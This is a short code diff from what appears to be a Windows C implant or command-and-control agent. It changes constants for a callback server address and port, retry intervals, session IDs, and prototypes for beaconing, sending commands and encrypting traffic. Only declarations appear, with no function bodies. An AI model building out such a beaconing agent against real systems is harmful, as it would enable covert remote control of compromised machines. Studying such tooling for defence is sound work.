@@ -30,22 +30,23 @@
 #define IV_LENGTH 12
 #define SALT_LENGTH 32
 #define TAG_LENGTH 16
-#define SESSION_ID_LENGTH 32
 #define SHA256_DIGEST_LENGTH 32
+#define SESSION_ID_LENGTH 32
 #define CHUNK_SIZE 1024
+#define SERVER_PORT "54678"
+#define SERVER_ADDRESS "10.0.0.129"
+#define MAX_IP_LEN 46
 
 // Globals
 SOCKET client_socket = INVALID_SOCKET;
 time_t start_time;
 FILE* log_file = NULL;
 int exit_process = FALSE;
-char SESSION_ID[SESSION_ID_LENGTH + 1] = {0};
+char SESSION_ID[SHA256_DIGEST_LENGTH + 1];
 char IP_ADDRESS[INET6_ADDRSTRLEN] = {0};
 const boolean LOGGING = TRUE;
 const char* CVER = "0.2.0";
 const char* TYPE = "c";
-const char* SERVER_ADDRESS = "10.0.0.129";
-const int SERVER_PORT = 54678;
 const int MAX_RETRIES = 5;
 const int RETRY_INTERVALS[] = {
     10000,   // 10 seconds
@@ -68,14 +69,12 @@ int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
 
 // Function prototypes
 void log_it(const char* format, ...);
-void get_session_id(char* ip_address);
-size_t b64_encoded_size(size_t inlen);
-size_t b64_decoded_size(const char *in);
-int b64_isvalidchar(char c);
+void get_session_id(const char *ip_address, char *session_id);
 char* base64_encode(const unsigned char *data, size_t length);
-int base64_decode(const char *in, unsigned char *out, size_t outlen);
+unsigned char* base64_decode(const char *data, size_t *length);
 char* encrypt_data(const char *data, const char *shared_key);
 char* decrypt_data(const char *encrypted, const char *shared_key);
+void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key);
 void send_command(const char* response);
 void send_beacon();
 void sleep_ms(int milliseconds);
